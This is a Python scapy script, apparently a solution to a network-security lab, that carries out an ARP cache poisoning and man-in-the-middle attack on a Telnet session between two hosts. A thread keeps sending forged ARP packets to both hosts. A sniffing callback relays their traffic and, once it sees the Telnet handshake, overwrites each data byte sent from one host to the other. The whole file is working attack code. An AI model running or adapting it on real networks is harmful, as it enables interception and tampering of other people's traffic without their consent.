#!/usr/bin/env python3
from fcntl import FASYNC
from time import sleep
from scapy.all import *

import threading
import re

class static_var_wrapper():
    telnet_login_reached = False


# telnet_login_mapper = r'(.*)login:'
static_var = static_var_wrapper()

class ARP_poison_thread(threading.Thread):

    def __init__(self, thread_id):
        threading.Thread.__init__(self)
        self.active = True
        self.thread_id = thread_id

    def run(self):
        E = Ether()
        A = ARP()

        while(self.active):
            # change the ARP cache in A
            # B's MAC to M's MAC
            # assume we already know about A's MAC, then we directly unicast
            E.dst = '02:42:0a:09:00:05'

            # 1 for ARP request
            # 2 for ARP reply
            A.op = 1
            A.hwsrc = '02:42:0a:09:00:69'
            A.psrc = '10.9.0.6'
            A.pdst = '10.9.0.5'

            pkt = E/A
            sendp(pkt, verbose=0)

            # change the ARP cache in B
            # A's MAC to M's MAC
            # assume we already know about B's MAC, then we directly unicast
            E.dst = '02:42:0a:09:00:06'

            # 1 for ARP request
            # 2 for ARP reply
            A.op = 1
            A.hwsrc = '02:42:0a:09:00:69'
            A.psrc = '10.9.0.5'
            A.pdst = '10.9.0.6'

            pkt = E/A
            sendp(pkt, verbose=0)

            sleep(5)
    
    def exit(self):
        self.active = False

def spoof_pkt(pkt):
    # spoof the packet if sent from A to B
    # Notice that checking pkt is the Ethernet packet and you always need to
    # check the Ethernet header to avoid program spoof the spoofed packet
    if pkt.src == '02:42:0a:09:00:05' and pkt[IP].src == '10.9.0.5' and pkt[IP].dst == '10.9.0.6':

        # Notice that copy packet is necessary since original one contains Ethernet header
        new_pkt = IP(bytes(pkt[IP]))
        # print('A to B')

        # remove checksum to ask scapy to calculate that again 
        del(new_pkt[TCP].payload)
        del(new_pkt[TCP].chksum)
        del(new_pkt.chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            if static_var.telnet_login_reached == False:
                login_match_result = True
                login_bytes_list = [255, 253, 1]
                data_list = list(data)
                for i in range(len(login_bytes_list)):
                    if(data_list[len(data_list)-1-i] != login_bytes_list[len(login_bytes_list)-1-i]):
                        login_match_result = False
                        break
                static_var.telnet_login_reached = login_match_result
                # print(data_list)
                # print(login_bytes_list)
                if static_var.telnet_login_reached:
                    print('telnet connected, now spoof!')
            else:
                data = list(data)
                for i in range(len(data)):
                    data[i] = ord('A')
                data = bytes(data)
            send(new_pkt/data, verbose=0)
        else:
            send(new_pkt, verbose=0)

    # replay the packet if sent from B to A
    # Notice that checking pkt is the Ethernet packet and you always need to
    # check the Ethernet header to avoid program spoof the spoofed packet
    if pkt.src == '02:42:0a:09:00:06' and pkt[IP].src == '10.9.0.6' and pkt[IP].dst == '10.9.0.5':
        # print('B to A')
        # Notice that copy packet is necessary since original one contains Ethernet header
        new_pkt = IP(bytes(pkt[IP]))
        del(new_pkt.chksum)
        del(new_pkt[TCP].chksum)
        send(new_pkt, verbose=0)
            

if __name__ == '__main__':
    # start one thread to conduct ARP poisoning
    background_thread = ARP_poison_thread(1)
    background_thread.start()

    # wait until poisoning finish
    sleep(3)

    pkt = sniff(iface='eth0', filter='tcp', prn=spoof_pkt)

    background_thread.exit()
    background_thread.join()

    print('all clean')


